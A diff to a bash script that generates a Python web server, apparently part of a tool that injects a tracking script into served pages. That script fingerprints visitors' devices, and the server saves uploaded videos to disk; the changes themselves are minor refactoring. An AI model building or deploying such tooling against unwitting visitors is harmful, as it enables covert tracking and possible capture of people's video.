@@ -274,18 +274,17 @@ print_log_line() {
 }
 
 write_server_py() {
-  cat >"$WORK_DIR/server.py" <<PYEOF
+  cat >"$WORK_DIR/server.py" <<'PYEOF'
 import http.server, json, re, sys, threading, uuid, os, time
 from datetime import datetime
 
-port, logfile = int(sys.argv[1]), sys.argv[2]
+port, logfile, BASE_DIR = int(sys.argv[1]), sys.argv[2], sys.argv[3]
 lock = threading.RLock()
 devices, devinfo, names, pending = {}, {}, {}, {}
 
-BASE_DIR = r"$BASE"
 VIDEO_DIR = os.path.join(BASE_DIR, "saved_videos")
 if not os.path.exists(VIDEO_DIR):
-    os.makedirs(VIDEO_DIR)
+    os.makedirs(VIDEO_DIR, exist_ok=True)
 
 BEACON_JS = """<script>(function(){try{
 var d={t:"__T__",w:screen.width,h:screen.height,r:window.devicePixelRatio||1,p:navigator.maxTouchPoints||0};
@@ -339,7 +338,6 @@ def flush(token):
 
 class Handler(http.server.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
-        # Memaksa server mencetak log request ke terminal/file log utama
         with open(logfile, "a") as f:
             f.write(f"[HTTP] {self.client_address[0]} - {format % args}\n")
 
@@ -461,7 +459,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                                         video_bytes = part[header_end + 4:-2]
                                         break
                         if not video_bytes:
-                            # Fallback jika boundary multipart gagal diparse
                             header_end = body_data.find(b'\r\n\r\n')
                             if header_end != -1:
                                 video_bytes = body_data[header_end + 4:-2]
@@ -527,7 +524,7 @@ start_server() {
   PORT="$(find_free_port)"
 
   write_server_py
-  ( cd "$WORK_DIR/site" && exec python3 "$WORK_DIR/server.py" "$PORT" "$ACCESS_LOG" ) \
+  ( cd "$WORK_DIR/site" && exec python3 "$WORK_DIR/server.py" "$PORT" "$ACCESS_LOG" "$BASE" ) \
     >"$WORK_DIR/server.log" 2>&1 &
   SERVER_PID=$!
   sleep 1
